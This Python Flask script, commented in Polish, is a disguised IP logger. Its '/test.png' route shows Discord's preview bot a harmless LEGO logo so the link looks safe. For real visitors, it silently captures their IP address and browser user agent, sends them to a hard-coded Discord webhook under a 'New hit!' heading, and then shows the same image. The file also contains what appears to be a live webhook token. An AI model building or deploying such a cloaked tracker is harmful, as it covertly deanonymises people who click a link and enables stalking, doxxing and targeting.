from flask import Flask, request, redirect
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1336930594799327529/VX0R1leJbv97emxJkz3rKjLKgr5BK6SgoSqcCn_cRc76VepZoxiEpPk3fcTPqgVYlyBi"

@app.route('/test.png')
def logger():
    ua = request.headers.get('User-Agent', 'Unknown')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # Jeśli to bot Discorda, tylko przekieruj do zdjęcia, nie wysyłaj logu
    if "Discordbot" in ua:
        return redirect("https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png")

    # Dane do wysłania
    payload = {
        "embeds": [{
            "title": "🎯 Nowe trafienie!",
            "description": f"**IP:** `{ip}`\n**Browser:** `{ua}`",
            "color": 16711680
        }]
    }

    # Nagłówki udające przeglądarkę, żeby Discord nie odrzucił połączenia
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

    try:
        # Próba wysłania z timeoutem i nagłówkami
        response = requests.post(WEBHOOK_URL, json=payload, headers=headers, timeout=10)
        print(f"Status Webhooka: {response.status_code}")
    except Exception as e:
        print(f"Błąd wysyłania: {e}")

    return redirect("https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png")

if __name__ == "__main__":
    app.run(port=10000)
